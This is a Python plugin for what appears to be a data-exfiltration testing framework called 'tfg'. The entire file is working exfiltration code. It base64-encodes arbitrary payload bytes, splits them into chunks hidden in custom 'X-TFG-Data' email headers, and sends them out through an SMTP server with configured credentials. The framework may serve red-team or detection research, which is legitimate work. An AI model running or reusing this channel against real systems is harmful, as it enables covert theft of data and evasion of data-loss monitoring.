from __future__ import annotations
from typing import Dict, Any, Iterable
import smtplib, ssl, base64
from email.message import EmailMessage
from tfg.plugins.api import ExfilClientPlugin

MAX_HDR = 700

class SmtpClientHeaders(ExfilClientPlugin):
    canal = "SMTP"
    metodo = 1
    name = "smtp_client_headers"

    def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
        host = config["smtp_host"]; port = int(config.get("smtp_port", 587))
        user = config["smtp_user"]; password = config["smtp_pass"]
        to_addr = config["to"]; from_addr = config.get("from") or user
        use_tls = bool(config.get("starttls", True))
        exfil_id = config.get("exfil_id") or "tfg"

        data = b"".join(payload_iter)
        b64 = base64.b64encode(data).decode("ascii")
        headers = [b64[i:i+MAX_HDR] for i in range(0, len(b64), MAX_HDR)]

        msg = EmailMessage()
        msg["Subject"] = f"TFG EXFIL {exfil_id}"
        msg["From"] = from_addr
        msg["To"] = to_addr
        for h in headers:
            msg.add_header("X-TFG-Data", h)
        msg.set_content("TFG EXFIL")

        ctx = ssl.create_default_context()
        with smtplib.SMTP(host, port, timeout=30) as s:
            if use_tls: s.starttls(context=ctx)
            s.login(user, password); s.send_message(msg)
        return {"ok": True, "headers": len(headers), "bytes": len(data)}
